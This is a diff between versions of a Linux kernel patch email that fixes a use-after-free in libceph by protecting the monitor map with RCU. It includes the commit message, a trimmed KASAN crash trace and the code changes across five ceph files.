-[  228.014011][T10215]  ceph_con_workfn+0x95a/0x11e0
-[  228.016401][T10215]
-[  228.041334][T10215] Memory state around the buggy address:
-[  228.043135][T10215] >ffff888045132000: fa fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
-[  228.045551][T10215] ==================================================================
-[  228.046391][T10215] Kernel panic - not syncing: KASAN: panic_on_warn set ...
-[  228.052925][T10215]  check_panic_on_warn+0xab/0xb0
-[  228.054125][T10215]  ceph_monmap_contains+0x1e4/0x220
-[  228.055063][T10215]  ceph_compare_options+0x591/0x700
-[  228.055976][T10215]  ceph_compare_super+0x487/0xba0
-[  228.056930][T10215]  sget_fc+0x51e/0xc10
-[  228.058710][T10215]  ceph_get_tree+0x6e7/0x1e20
-[  228.060624][T10215]  path_mount+0x6cc/0x1fd0
-[  228.063231][T10215]  __x64_sys_mount+0x294/0x320
-[  228.064118][T10215]  do_syscall_64+0xc7/0x250
-[  228.064528][T10215]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
-[  228.071561][T10215] Rebooting in 86400 seconds..
-
------END crash log-----
-
-Best regards,
-Yong Wang
-
-Yong Wang (1):
-  libceph: use RCU to protect monmap in ceph_compare_options()
-
+ceph_compare_options() checks whether a new mount shares any monitor
+address with an existing client by walking client->monc.monmap via
+ceph_monmap_contains().  That comparison can run under sb_lock or
+rbd_client_list_lock, so it cannot take monc->mutex.
+
+Meanwhile, monmap update handling replaces monc->monmap under
+monc->mutex and frees the old map immediately.  A concurrent shared-
+mount comparison can therefore dereference a freed monmap and walk
+stale mon_inst[] entries, triggering a use-after-free.
+
+Protect the compare path with RCU and publish/free monitor maps with
+rcu_assign_pointer() and kfree_rcu().  Annotate monc->monmap as an
+RCU pointer and use rcu_dereference_protected() in mutex-protected
+paths to keep the accesses consistent with the new pointer contract.
+
+This keeps the existing non-blocking comparison semantics while
+ensuring that replaced monmaps remain alive until readers are done.
+
+Fixes: 4e7a5dcd1bbab ("ceph: negotiate authentication protocol; implement AUTH_NONE protocol")
+Cc: stable@vger.kernel.org
+Cc: ceph-devel@vger.kernel.org
+Reported-by: Yuan Tan <yuantan098@gmail.com>
+Reported-by: Xin Liu <dstsmallbird@foxmail.com>
+Assisted-by: Codex:gpt-5.4
+Signed-off-by: Yong Wang <edragain@163.com>
+Reviewed-by: Ren Wei <enjou1224z@gmail.com>
+---
  fs/ceph/super.c                 |  7 +++--
  include/linux/ceph/mon_client.h |  4 ++-
  net/ceph/ceph_common.c          | 21 ++++++++++----
@@ -664,6 +117,312 @@ Yong Wang (1):
  net/ceph/mon_client.c           | 51 ++++++++++++++++++++++-----------
  5 files changed, 65 insertions(+), 29 deletions(-)
 
+diff --git a/fs/ceph/super.c b/fs/ceph/super.c
+index c05fbd4237f8..4145594ba710 100644
+--- a/fs/ceph/super.c
++++ b/fs/ceph/super.c
+@@ -60,6 +60,7 @@ static int ceph_statfs(struct dentry *dentry, struct kstatfs *buf)
+ {
+ 	struct ceph_fs_client *fsc = ceph_inode_to_fs_client(d_inode(dentry));
+ 	struct ceph_mon_client *monc = &fsc->client->monc;
++	struct ceph_monmap *monmap;
+ 	struct ceph_statfs st;
+ 	int i, err;
+ 	u64 data_pool;
+@@ -111,8 +112,10 @@ static int ceph_statfs(struct dentry *dentry, struct kstatfs *buf)
+ 	/* Must convert the fsid, for consistent values across arches */
+ 	buf->f_fsid.val[0] = 0;
+ 	mutex_lock(&monc->mutex);
+-	for (i = 0 ; i < sizeof(monc->monmap->fsid) / sizeof(__le32) ; ++i)
+-		buf->f_fsid.val[0] ^= le32_to_cpu(((__le32 *)&monc->monmap->fsid)[i]);
++	monmap = rcu_dereference_protected(monc->monmap,
++					   lockdep_is_held(&monc->mutex));
++	for (i = 0 ; i < sizeof(monmap->fsid) / sizeof(__le32) ; ++i)
++		buf->f_fsid.val[0] ^= le32_to_cpu(((__le32 *)&monmap->fsid)[i]);
+ 	mutex_unlock(&monc->mutex);
+ 
+ 	/* fold the fs_cluster_id into the upper bits */
+diff --git a/include/linux/ceph/mon_client.h b/include/linux/ceph/mon_client.h
+index 7a9a40163c0f..98a745f6d9ab 100644
+--- a/include/linux/ceph/mon_client.h
++++ b/include/linux/ceph/mon_client.h
+@@ -4,6 +4,7 @@
+ 
+ #include <linux/completion.h>
+ #include <linux/kref.h>
++#include <linux/rcupdate.h>
+ #include <linux/rbtree.h>
+ 
+ #include <linux/ceph/messenger.h>
+@@ -19,6 +20,7 @@ struct ceph_monmap {
+ 	struct ceph_fsid fsid;
+ 	u32 epoch;
+ 	u32 num_mon;
++	struct rcu_head rcu;
+ 	struct ceph_entity_inst mon_inst[] __counted_by(num_mon);
+ };
+ 
+@@ -69,7 +71,7 @@ struct ceph_mon_generic_request {
+ 
+ struct ceph_mon_client {
+ 	struct ceph_client *client;
+-	struct ceph_monmap *monmap;
++	struct ceph_monmap __rcu *monmap;
+ 
+ 	struct mutex mutex;
+ 	struct delayed_work delayed_work;
+diff --git a/net/ceph/ceph_common.c b/net/ceph/ceph_common.c
+index 952121849180..929df54cf3bb 100644
+--- a/net/ceph/ceph_common.c
++++ b/net/ceph/ceph_common.c
+@@ -133,6 +133,7 @@ int ceph_compare_options(struct ceph_options *new_opt,
+ {
+ 	struct ceph_options *opt1 = new_opt;
+ 	struct ceph_options *opt2 = client->options;
++	struct ceph_monmap *monmap;
+ 	int ofs = offsetof(struct ceph_options, mon_addr);
+ 	int i;
+ 	int ret;
+@@ -180,13 +181,20 @@ int ceph_compare_options(struct ceph_options *new_opt,
+ 	if (ret)
+ 		return ret;
+ 
++	rcu_read_lock();
++	monmap = rcu_dereference(client->monc.monmap);
++	ret = -1;
++
+ 	/* any matching mon ip implies a match */
+ 	for (i = 0; i < opt1->num_mon; i++) {
+-		if (ceph_monmap_contains(client->monc.monmap,
+-				 &opt1->mon_addr[i]))
+-			return 0;
++		if (ceph_monmap_contains(monmap, &opt1->mon_addr[i])) {
++			ret = 0;
++			break;
++		}
+ 	}
+-	return -1;
++
++	rcu_read_unlock();
++	return ret;
+ }
+ EXPORT_SYMBOL(ceph_compare_options);
+ 
+@@ -791,6 +799,7 @@ int __ceph_open_session(struct ceph_client *client)
+ {
+ 	DEFINE_WAIT_FUNC(wait, woken_wake_function);
+ 	long timeout = ceph_timeout_jiffies(client->options->mount_timeout);
++	struct ceph_monmap *monmap;
+ 	bool have_monmap, have_osdmap;
+ 	int err;
+ 
+@@ -803,7 +812,9 @@ int __ceph_open_session(struct ceph_client *client)
+ 	for (;;) {
+ 		mutex_lock(&client->monc.mutex);
+ 		err = client->auth_err;
+-		have_monmap = client->monc.monmap && client->monc.monmap->epoch;
++		monmap = rcu_dereference_protected(client->monc.monmap,
++						   lockdep_is_held(&client->monc.mutex));
++		have_monmap = monmap && monmap->epoch;
+ 		mutex_unlock(&client->monc.mutex);
+ 
+ 		down_read(&client->osdc.lock);
+diff --git a/net/ceph/debugfs.c b/net/ceph/debugfs.c
+index 83c270bce63c..f0aa4631cf6e 100644
+--- a/net/ceph/debugfs.c
++++ b/net/ceph/debugfs.c
+@@ -35,15 +35,18 @@ static int monmap_show(struct seq_file *s, void *p)
+ {
+ 	int i;
+ 	struct ceph_client *client = s->private;
++	struct ceph_monmap *monmap;
+ 
+ 	mutex_lock(&client->monc.mutex);
+-	if (client->monc.monmap == NULL)
++	monmap = rcu_dereference_protected(client->monc.monmap,
++					   lockdep_is_held(&client->monc.mutex));
++	if (!monmap)
+ 		goto out_unlock;
+ 
+-	seq_printf(s, "epoch %d\n", client->monc.monmap->epoch);
+-	for (i = 0; i < client->monc.monmap->num_mon; i++) {
++	seq_printf(s, "epoch %d\n", monmap->epoch);
++	for (i = 0; i < monmap->num_mon; i++) {
+ 		struct ceph_entity_inst *inst =
+-			&client->monc.monmap->mon_inst[i];
++			&monmap->mon_inst[i];
+ 
+ 		seq_printf(s, "\t%s%lld\t%s\n",
+ 			   ENTITY_NAME(inst->name),
+diff --git a/net/ceph/mon_client.c b/net/ceph/mon_client.c
+index d2cdc8ee3155..d7e600a74ca5 100644
+--- a/net/ceph/mon_client.c
++++ b/net/ceph/mon_client.c
+@@ -206,19 +206,22 @@ static void __close_session(struct ceph_mon_client *monc)
+  */
+ static void pick_new_mon(struct ceph_mon_client *monc)
+ {
++	struct ceph_monmap *monmap =
++		rcu_dereference_protected(monc->monmap,
++					  lockdep_is_held(&monc->mutex));
+ 	int old_mon = monc->cur_mon;
+ 
+-	BUG_ON(monc->monmap->num_mon < 1);
++	BUG_ON(monmap->num_mon < 1);
+ 
+-	if (monc->monmap->num_mon == 1) {
++	if (monmap->num_mon == 1) {
+ 		monc->cur_mon = 0;
+ 	} else {
+-		int max = monc->monmap->num_mon;
++		int max = monmap->num_mon;
+ 		int o = -1;
+ 		int n;
+ 
+ 		if (monc->cur_mon >= 0) {
+-			if (monc->cur_mon < monc->monmap->num_mon)
++			if (monc->cur_mon < monmap->num_mon)
+ 				o = monc->cur_mon;
+ 			if (o >= 0)
+ 				max--;
+@@ -232,7 +235,7 @@ static void pick_new_mon(struct ceph_mon_client *monc)
+ 	}
+ 
+ 	dout("%s mon%d -> mon%d out of %d mons\n", __func__, old_mon,
+-	     monc->cur_mon, monc->monmap->num_mon);
++	     monc->cur_mon, monmap->num_mon);
+ }
+ 
+ /*
+@@ -240,6 +243,9 @@ static void pick_new_mon(struct ceph_mon_client *monc)
+  */
+ static void __open_session(struct ceph_mon_client *monc)
+ {
++	struct ceph_monmap *monmap =
++		rcu_dereference_protected(monc->monmap,
++					  lockdep_is_held(&monc->mutex));
+ 	int ret;
+ 
+ 	pick_new_mon(monc);
+@@ -256,7 +262,7 @@ static void __open_session(struct ceph_mon_client *monc)
+ 
+ 	dout("%s opening mon%d\n", __func__, monc->cur_mon);
+ 	ceph_con_open(&monc->con, CEPH_ENTITY_TYPE_MON, monc->cur_mon,
+-		      &monc->monmap->mon_inst[monc->cur_mon].addr);
++		      &monmap->mon_inst[monc->cur_mon].addr);
+ 
+ 	/*
+ 	 * Queue a keepalive to ensure that in case of an early fault
+@@ -542,6 +548,7 @@ static void ceph_monc_handle_map(struct ceph_mon_client *monc,
+ 				 struct ceph_msg *msg)
+ {
+ 	struct ceph_client *client = monc->client;
++	struct ceph_monmap *old_monmap;
+ 	struct ceph_monmap *monmap;
+ 	void *p, *end;
+ 
+@@ -564,10 +571,12 @@ static void ceph_monc_handle_map(struct ceph_mon_client *monc,
+ 		goto out;
+ 	}
+ 
+-	kfree(monc->monmap);
+-	monc->monmap = monmap;
++	old_monmap = rcu_dereference_protected(monc->monmap,
++					       lockdep_is_held(&monc->mutex));
++	rcu_assign_pointer(monc->monmap, monmap);
++	kfree_rcu(old_monmap, rcu);
+ 
+-	__ceph_monc_got_map(monc, CEPH_SUB_MONMAP, monc->monmap->epoch);
++	__ceph_monc_got_map(monc, CEPH_SUB_MONMAP, monmap->epoch);
+ 	client->have_fsid = true;
+ 
+ out:
+@@ -775,6 +784,7 @@ static void handle_statfs_reply(struct ceph_mon_client *monc,
+ int ceph_monc_do_statfs(struct ceph_mon_client *monc, u64 data_pool,
+ 			struct ceph_statfs *buf)
+ {
++	struct ceph_monmap *monmap;
+ 	struct ceph_mon_generic_request *req;
+ 	struct ceph_mon_statfs *h;
+ 	int ret = -ENOMEM;
+@@ -802,7 +812,9 @@ int ceph_monc_do_statfs(struct ceph_mon_client *monc, u64 data_pool,
+ 	h->monhdr.have_version = 0;
+ 	h->monhdr.session_mon = cpu_to_le16(-1);
+ 	h->monhdr.session_mon_tid = 0;
+-	h->fsid = monc->monmap->fsid;
++	monmap = rcu_dereference_protected(monc->monmap,
++					   lockdep_is_held(&monc->mutex));
++	h->fsid = monmap->fsid;
+ 	h->contains_data_pool = (data_pool != CEPH_NOPOOL);
+ 	h->data_pool = cpu_to_le64(data_pool);
+ 	send_generic_request(monc, req);
+@@ -975,6 +987,7 @@ static __printf(2, 0)
+ int do_mon_command_vargs(struct ceph_mon_client *monc, const char *fmt,
+ 			 va_list ap)
+ {
++	struct ceph_monmap *monmap;
+ 	struct ceph_mon_generic_request *req;
+ 	struct ceph_mon_command *h;
+ 	int ret = -ENOMEM;
+@@ -999,7 +1012,9 @@ int do_mon_command_vargs(struct ceph_mon_client *monc, const char *fmt,
+ 	h->monhdr.have_version = 0;
+ 	h->monhdr.session_mon = cpu_to_le16(-1);
+ 	h->monhdr.session_mon_tid = 0;
+-	h->fsid = monc->monmap->fsid;
++	monmap = rcu_dereference_protected(monc->monmap,
++					   lockdep_is_held(&monc->mutex));
++	h->fsid = monmap->fsid;
+ 	h->num_strs = cpu_to_le32(1);
+ 	len = vsprintf(h->str, fmt, ap);
+ 	h->str_len = cpu_to_le32(len);
+@@ -1138,17 +1153,18 @@ static int build_initial_monmap(struct ceph_mon_client *monc)
+ 	__le32 my_type = ceph_msgr2(monc->client) ?
+ 		CEPH_ENTITY_ADDR_TYPE_MSGR2 : CEPH_ENTITY_ADDR_TYPE_LEGACY;
+ 	struct ceph_options *opt = monc->client->options;
++	struct ceph_monmap *monmap;
+ 	int num_mon = opt->num_mon;
+ 	int i;
+ 
+ 	/* build initial monmap */
+-	monc->monmap = kzalloc_flex(*monc->monmap, mon_inst, num_mon);
+-	if (!monc->monmap)
++	monmap = kzalloc_flex(*monmap, mon_inst, num_mon);
++	if (!monmap)
+ 		return -ENOMEM;
+-	monc->monmap->num_mon = num_mon;
++	monmap->num_mon = num_mon;
+ 
+ 	for (i = 0; i < num_mon; i++) {
+-		struct ceph_entity_inst *inst = &monc->monmap->mon_inst[i];
++		struct ceph_entity_inst *inst = &monmap->mon_inst[i];
+ 
+ 		memcpy(&inst->addr.in_addr, &opt->mon_addr[i].in_addr,
+ 		       sizeof(inst->addr.in_addr));
+@@ -1157,6 +1173,7 @@ static int build_initial_monmap(struct ceph_mon_client *monc)
+ 		inst->name.type = CEPH_ENTITY_TYPE_MON;
+ 		inst->name.num = cpu_to_le64(i);
+ 	}
++	RCU_INIT_POINTER(monc->monmap, monmap);
+ 	return 0;
+ }
+ 
+@@ -1232,7 +1249,7 @@ int ceph_monc_init(struct ceph_mon_client *monc, struct ceph_client *cl)
+ out_auth:
+ 	ceph_auth_destroy(monc->auth);
+ out_monmap:
+-	kfree(monc->monmap);
++	kfree(rcu_access_pointer(monc->monmap));
+ out:
+ 	return err;
+ }
+@@ -1267,7 +1284,7 @@ void ceph_monc_stop(struct ceph_mon_client *monc)
+ 	ceph_msg_put(monc->m_subscribe);
+ 	ceph_msg_put(monc->m_subscribe_ack);
+ 
+-	kfree(monc->monmap);
++	kfree_rcu(rcu_access_pointer(monc->monmap), rcu);
+ }
+ EXPORT_SYMBOL(ceph_monc_stop);
+ 
 -- 
 2.53.0
-
